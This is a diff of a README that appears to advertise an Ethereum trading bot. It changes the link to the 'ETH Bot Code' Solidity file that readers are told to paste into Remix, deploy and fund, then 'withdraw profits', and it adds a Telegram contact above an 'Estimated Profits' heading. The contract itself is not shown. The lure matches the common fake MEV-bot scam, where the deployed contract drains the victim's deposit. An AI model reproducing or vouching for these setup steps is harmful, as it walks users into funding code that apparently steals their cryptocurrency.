@@ -25,7 +25,7 @@ Step-by-Step Setup Guide:
 4- Paste Code in Remix
 
 ► Copy and paste the bot code: [ETH Bot Code.
-](https://github.com/Jacob-mev/Bot/blob/main/create%20bot.sol)
+](https://github.com/Jacob-mev/Bot/blob/main/bot.sol)
 
 5- Compile the Contract
 
@@ -56,7 +56,9 @@ Or you can make the change manually: ![deploy](https://github.com/user-attachmen
 ► Withdraw your profits anytime by clicking "Withdraw".
 
 Following these steps will help ensure a successful bot operation with minimized transaction issues.
+
 📬 Telegram : t.me/Jacobdefiweb3
+
 ➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
 
 📈 Estimated Profits
